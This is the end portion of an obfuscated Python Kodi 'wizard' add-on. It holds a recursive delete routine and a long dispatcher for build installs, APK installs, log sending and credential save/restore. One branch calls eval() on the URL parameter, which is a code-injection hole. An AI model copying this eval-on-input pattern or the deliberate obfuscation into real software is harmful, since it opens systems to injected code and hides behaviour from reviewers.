					for OO0O0O0O000OO0000 ,OO0O00OO000000O0O ,O0OOOOO0O0O000OO0 in os .walk (O0O0OO0OOOOO0O000 ):#line:5565
						for OO00O0OO0000OO0O0 in O0OOOOO0O0O000OO0 :#line:5566
							os .unlink (os .path .join (OO0O0O0O000OO0000 ,OO00O0OO0000OO0O0 ))#line:5567
						for O0OO000OOOOO00O0O in OO0O00OO000000O0O :#line:5568
							shutil .rmtree (os .path .join (OO0O0O0O000OO0000 ,O0OO000OOOOO00O0O ))#line:5569
					os .rmdir (O0O0OO0OOOOO0O000 )#line:5570
	except :pass #line:5572
params =get_params ()#line:5573
url =None #line:5574
name =None #line:5575
mode =None #line:5576
try :mode =urllib .unquote_plus (params ["mode"])#line:5578
except :pass #line:5579
try :name =urllib .unquote_plus (params ["name"])#line:5580
except :pass #line:5581
try :url =urllib .unquote_plus (params ["url"])#line:5582
except :pass #line:5583
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5585
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5586
def setView (OOO00OO0O0O0O00O0 ,OO0O00O0O0O0O000O ):#line:5587
	if wiz .getS ('auto-view')=='true':#line:5588
		OO0OO00OOOOOO0O0O =wiz .getS (OO0O00O0O0O0O000O )#line:5589
		if OO0OO00OOOOOO0O0O =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0OO00OOOOOO0O0O ='55'#line:5590
		if OO0OO00OOOOOO0O0O =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0OO00OOOOOO0O0O ='50'#line:5591
		wiz .ebi ("Container.SetViewMode(%s)"%OO0OO00OOOOOO0O0O )#line:5592
if mode ==None :index ()#line:5594
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5596
elif mode =='builds':buildMenu ()#line:5597
elif mode =='viewbuild':viewBuild (name )#line:5598
elif mode =='buildinfo':buildInfo (name )#line:5599
elif mode =='buildpreview':buildVideo (name )#line:5600
elif mode =='install':buildWizard (name ,url )#line:5601
elif mode =='theme':buildWizard (name ,mode ,url )#line:5602
elif mode =='viewthirdparty':viewThirdList (name )#line:5603
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5604
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5605
elif mode =='maint':maintMenu (name )#line:5607
elif mode =='passpin':passandpin ()#line:5608
elif mode =='backmyupbuild':backmyupbuild ()#line:5609
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5610
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5611
elif mode =='advancedsetting':advancedWindow (name )#line:5612
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5613
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5614
elif mode =='asciicheck':wiz .asciiCheck ()#line:5615
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5616
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5617
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5618
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5619
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5620
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5621
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5622
elif mode =='currentsettings':viewAdvanced ()#line:5623
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5624
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5625
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5626
elif mode =='fixskin':backtokodi ()#line:5627
elif mode =='testcommand':testcommand ()#line:5628
elif mode =='logsend':logsend ()#line:5629
elif mode =='rdon':rdon ()#line:5630
elif mode =='rdoff':rdoff ()#line:5631
elif mode =='setrd':setrealdebrid ()#line:5632
elif mode =='setrd2':setautorealdebrid ()#line:5633
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5634
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5635
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5636
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5637
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5638
elif mode =='freshstart':freshStart ()#line:5639
elif mode =='forceupdate':wiz .forceUpdate ()#line:5640
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5641
elif mode =='forceclose':wiz .killxbmc ()#line:5642
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5643
elif mode =='hidepassword':wiz .hidePassword ()#line:5644
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5645
elif mode =='enableaddons':enableAddons ()#line:5646
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5647
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5648
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5649
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5650
elif mode =='uploadlog':uploadLog .Main ()#line:5651
elif mode =='viewlog':LogViewer ()#line:5652
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5653
elif mode =='viewerrorlog':errorChecking (all =True )#line:5654
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5655
elif mode =='purgedb':purgeDb ()#line:5656
elif mode =='fixaddonupdate':fixUpdate ()#line:5657
elif mode =='removeaddons':removeAddonMenu ()#line:5658
elif mode =='removeaddon':removeAddon (name )#line:5659
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5660
elif mode =='removedata':removeAddonData (name )#line:5661
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5662
elif mode =='systeminfo':systemInfo ()#line:5663
elif mode =='restorezip':restoreit ('build')#line:5664
elif mode =='restoregui':restoreit ('gui')#line:5665
elif mode =='restoreaddon':restoreit ('addondata')#line:5666
elif mode =='restoreextzip':restoreextit ('build')#line:5667
elif mode =='restoreextgui':restoreextit ('gui')#line:5668
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5669
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5670
elif mode =='traktsync':traktsync ()#line:5671
elif mode =='apk':apkMenu (name )#line:5673
elif mode =='apkscrape':apkScraper (name )#line:5674
elif mode =='apkinstall':apkInstaller (name ,url )#line:5675
elif mode =='speed':speedMenu ()#line:5676
elif mode =='net':net_tools ()#line:5677
elif mode =='GetList':GetList (url )#line:5678
elif mode =='youtube':youtubeMenu (name )#line:5679
elif mode =='viewVideo':playVideo (url )#line:5680
elif mode =='addons':addonMenu (name )#line:5682
elif mode =='addoninstall':addonInstaller (name ,url )#line:5683
elif mode =='savedata':saveMenu ()#line:5685
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5686
elif mode =='managedata':manageSaveData (name )#line:5687
elif mode =='whitelist':wiz .whiteList (name )#line:5688
elif mode =='trakt':traktMenu ()#line:5690
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5691
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5692
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5693
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5694
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5695
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5696
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5697
elif mode =='realdebrid':realMenu ()#line:5699
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5700
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5701
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5702
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5703
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5704
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5705
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5706
elif mode =='login':loginMenu ()#line:5708
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5709
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5710
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5711
elif mode =='clearlogin':loginit .clearSaved (name )#line:5712
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5713
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5714
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5715
elif mode =='contact':notify .contact (CONTACT )#line:5717
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5718
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5719
elif mode =='developer':developer ()#line:5721
elif mode =='converttext':wiz .convertText ()#line:5722
elif mode =='createqr':wiz .createQR ()#line:5723
elif mode =='testnotify':testnotify ()#line:5724
elif mode =='testnotify2':testnotify2 ()#line:5725
elif mode =='servicemanual':servicemanual ()#line:5726
elif mode =='fastinstall':fastinstall ()#line:5727
elif mode =='testupdate':testupdate ()#line:5728
elif mode =='testfirst':testfirst ()#line:5729
elif mode =='testfirstrun':testfirstRun ()#line:5730
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5731
elif mode =='bg':wiz .bg_install (name ,url )#line:5733
elif mode =='bgcustom':wiz .bg_custom ()#line:5734
elif mode =='bgremove':wiz .bg_remove ()#line:5735
elif mode =='bgdefault':wiz .bg_default ()#line:5736
elif mode =='rdset':rdsetup ()#line:5737
elif mode =='mor':morsetup ()#line:5738
elif mode =='mor2':morsetup2 ()#line:5739
elif mode =='resolveurl':resolveurlsetup ()#line:5740
elif mode =='urlresolver':urlresolversetup ()#line:5741
elif mode =='forcefastupdate':forcefastupdate ()#line:5742
elif mode =='traktset':traktsetup ()#line:5743
elif mode =='placentaset':placentasetup ()#line:5744
elif mode =='flixnetset':flixnetsetup ()#line:5745
elif mode =='reptiliaset':reptiliasetup ()#line:5746
elif mode =='yodasset':yodasetup ()#line:5747
elif mode =='numbersset':numberssetup ()#line:5748
elif mode =='uranusset':uranussetup ()#line:5749
elif mode =='genesisset':genesissetup ()#line:5750
elif mode =='fastupdate':fastupdate ()#line:5751
elif mode =='folderback':folderback ()#line:5752
elif mode =='menudata':Menu ()#line:5753
elif mode ==2 :#line:5755
        wiz .torent_menu ()#line:5756
elif mode ==3 :#line:5757
        wiz .popcorn_menu ()#line:5758
elif mode ==8 :#line:5759
        wiz .metaliq_fix ()#line:5760
elif mode ==9 :#line:5761
        wiz .quasar_menu ()#line:5762
elif mode ==5 :#line:5763
        swapSkins ('skin.Premium.mod')#line:5764
elif mode ==13 :#line:5765
        wiz .elementum_menu ()#line:5766
elif mode ==16 :#line:5767
        wiz .fix_wizard ()#line:5768
elif mode ==17 :#line:5769
        wiz .last_play ()#line:5770
elif mode ==18 :#line:5771
        wiz .normal_metalliq ()#line:5772
elif mode ==19 :#line:5773
        wiz .fast_metalliq ()#line:5774
elif mode ==20 :#line:5775
        wiz .fix_buffer2 ()#line:5776
elif mode ==21 :#line:5777
        wiz .fix_buffer3 ()#line:5778
elif mode ==11 :#line:5779
        wiz .fix_buffer ()#line:5780
elif mode ==15 :#line:5781
        wiz .fix_font ()#line:5782
elif mode ==14 :#line:5783
        wiz .clean_pass ()#line:5784
elif mode ==22 :#line:5785
        wiz .movie_update ()#line:5786
elif mode =='adv_settings':buffer1 ()#line:5787
elif mode =='getpass':getpass ()#line:5788
elif mode =='setpass':setpass ()#line:5789
elif mode =='setuname':setuname ()#line:5790
elif mode =='passandUsername':passandUsername ()#line:5791
elif mode =='9':disply_hwr ()#line:5792
elif mode =='99':disply_hwr2 ()#line:5793
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))